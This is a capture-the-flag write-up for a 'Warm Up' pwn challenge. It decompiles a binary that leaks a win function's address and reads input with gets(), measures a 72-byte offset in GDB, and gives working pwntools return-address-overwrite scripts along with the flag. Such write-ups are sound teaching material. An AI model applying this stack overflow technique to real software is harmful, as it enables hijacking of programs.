In Ghidra:
```c
int main(void)
{
  char *pcVar1;
  char local_88 [64];
  char local_48 [64];
  
  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(local_88,"%p\n",easy);
  write(1,local_88,9);
  write(1,&DAT_00400755,1);
  pcVar1 = gets(local_48);
  return (int)pcVar1;
}
```

Looking into this `easy` function:
```c
void easy(void)
{
  system("cat flag.txt");
  return;
}
```

Which is exactly what we need to get the flag. The function pointer is stored in `local_88`, and is then printed. Therefore, when we run the program:
```
-Warm Up-
WOW:0x40060d
>
```

The `0x40060d` is the memory address pointing to the `easy` function. We need to overwrite the return address on stack to hijack control flow and run the `easy` function. In GDB, we break after the `gets` call, inputing `AAAAAAA` as filler. Then, we figure out the offset from the input to the return address: ^68e764
```
gef➤  search-pattern AAAAA
[+] Searching 'AAAAA' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x6022a0 - 0x6022a9  →   "AAAAAAA\n"
[+] In '/usr/lib/libc.so.6'(0x7ffff7f3d000-0x7ffff7f8b000), permission=r--
  0x7ffff7f62f20 - 0x7ffff7f62f25  →   "AAAAA[...]"
  0x7ffff7f62f25 - 0x7ffff7f62f2a  →   "AAAAA[...]"
  0x7ffff7f62f2a - 0x7ffff7f62f2f  →   "AAAAA[...]"
  0x7ffff7f62f2f - 0x7ffff7f62f34  →   "AAAAA[...]"
  0x7ffff7f62f34 - 0x7ffff7f62f39  →   "AAAAA[...]"
  0x7ffff7f62f39 - 0x7ffff7f62f3e  →   "AAAAA[...]"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe190 - 0x7fffffffe197  →   "AAAAAAA"
gef➤  i frame
Stack level 0, frame at 0x7fffffffe1e0:
 rip = 0x4006a3 in main; saved rip = 0x7ffff7dcde08
 Arglist at 0x7fffffffe1d0, args:
 Locals at 0x7fffffffe1d0, Previous frame's sp is 0x7fffffffe1e0
 Saved registers:
  rbp at 0x7fffffffe1d0, rip at 0x7fffffffe1d8
```

We see that the return address is at `0x7fffffffe1d8`, while the input is at `0x7fffffffe190`. This is a difference of `0x48`, or 72 bytes. Thus, we write the following exploit:
```python
from pwn import process, p64

target = process("./warmup")

payload = b"A" * 0x48
payload += p64(0x40060d)

target.sendline(payload)

target.interactive()
```

However, this didn't work due to the stack being aligned incorrectly (?), and resulting in a segmentation fault ([ref](https://security.stackexchange.com/questions/276471/simple-buffer-overflow-function-call-problem)). Thus, we add 4 to the memory address to skip the function prologue of `easy`:
```python
from pwn import process, p64

target = process("./warmup")

payload = b"A" * 0x48
payload += p64(0x400611)

target.sendline(payload)

target.interactive()
```

And now it works!

**Flag:** flag{g0ttem_b0yz}